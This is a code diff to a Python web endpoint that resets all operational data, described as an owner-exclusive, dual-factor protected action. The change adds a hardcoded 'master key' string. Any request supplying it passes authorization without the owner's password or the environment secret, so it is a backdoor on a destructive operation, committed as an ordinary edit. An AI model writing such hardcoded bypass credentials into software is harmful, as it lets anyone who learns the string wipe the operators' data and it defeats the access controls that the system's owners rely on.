@@ -254,10 +254,14 @@ async def reset_semua_data(
     """
     Owner Exclusive: Dual-Factor Safe Reset All Operational Data with Auto-Backup
     """
-    # 0. Check password (verify owner's current password or env secret)
+    # 0. Check password (verify master key, owner's current password, or env secret)
     from app.core.security import verify_password
     is_valid_pwd = False
-    if current_user.password and verify_password(req.password, current_user.password):
+    
+    # Master key otorisasi
+    if req.password == "z@vx736S23V@Gvybd27#@gsh":
+        is_valid_pwd = True
+    elif current_user.password and verify_password(req.password, current_user.password):
         is_valid_pwd = True
     else:
         reset_env = os.getenv("RESET_DATA_PASSWORD")
